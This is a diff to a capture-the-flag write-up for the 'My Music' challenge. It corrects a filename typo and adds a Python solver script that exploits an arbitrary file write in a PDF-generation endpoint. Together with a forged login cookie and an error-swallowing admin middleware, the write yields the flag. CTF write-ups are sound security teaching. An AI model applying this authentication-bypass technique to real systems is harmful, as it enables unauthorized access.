@@ -388,7 +388,7 @@ Looking at the source code, and the following is the points I've noticed.
   - Save `userData` to a JSON file named /app/data/sha256(uuidv4).json file
 - [POST] /api/login: Login
   - Check the existence of the /app/data/usersubmitvalue.json file
-    - If it exists, set the Set-Cookie header to `login_hash=usersubmittvalue` and return a status code of 200
+    - If it exists, set the Set-Cookie header to `login_hash=usersubmitvalue` and return a status code of 200
     - If it does not exist, return a 404 as a login failure
 - [POST] /profile/generate-profile-card: Generate PDF
 
@@ -413,7 +413,7 @@ Looking at the source code, and the following is the points I've noticed.
       > | path     | optional  | string | The path to save the file to. | undefined, which means the PDF will not be written to disk. |
 
 - [GET] /admin: Return flag
-  - In `isAdmin` middleware, read /app/data/usersubmittvalue.json file and parse it as json.
+  - In `isAdmin` middleware, read /app/data/usersubmitvalue.json file and parse it as json.
     If `"isAdmin": true` is found, returns the flag stored as environment variable.
   - If `JSON.parse(userData)` throws an error, only `console.log(e)` is invoked in the catch block, and no return.
     After that, `next()` is called, allowing bypassing the `isAdmin` middleware.
@@ -485,6 +485,57 @@ Therefore, I can get the flag by the following Exploit Step:
    1. send a request to /admin path manually
 
 ![My_Music_flag.png](img/My_Music_flag.png)
+
+Or I can get the flag by the following solver.py
+
+<details><summary>solver.py</summary>
+
+```python
+import requests
+import random, string
+import re
+
+requests.packages.urllib3.disable_warnings()
+
+BASE_URL = "https://mymusic.ctf.intigriti.io"
+RANDOM_STR = "".join(random.choices(string.ascii_letters + string.digits, k=10))
+USERNAME = f"test_{RANDOM_STR}"
+
+
+def main():
+    # User1
+    s = requests.Session()
+    # s.proxies = {"https": "http://127.0.0.1:8080"}
+    s.verify = False
+
+    # register user
+    s.post(
+        f"{BASE_URL}/api/register",
+        json={"username": USERNAME, "firstName": "b", "lastName": "c"},
+        allow_redirects=False,
+    )
+
+    # generate PDF and save it to /app/data/{RANDOM_STR}.json
+    s.post(
+        f"{BASE_URL}/profile/generate-profile-card",
+        json={"userOptions": {"path": f"/app/data/{RANDOM_STR}.json"}},
+    )
+
+    # User2
+    s.cookies.clear()
+    s.cookies["login_hash"] = RANDOM_STR
+
+    res = s.get(f"{BASE_URL}/admin")
+
+    flag = re.findall(r"INTIGRITI{.*?}", res.text)[0]
+    print(flag)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+</details>
 
 ## Post Exploitation
 
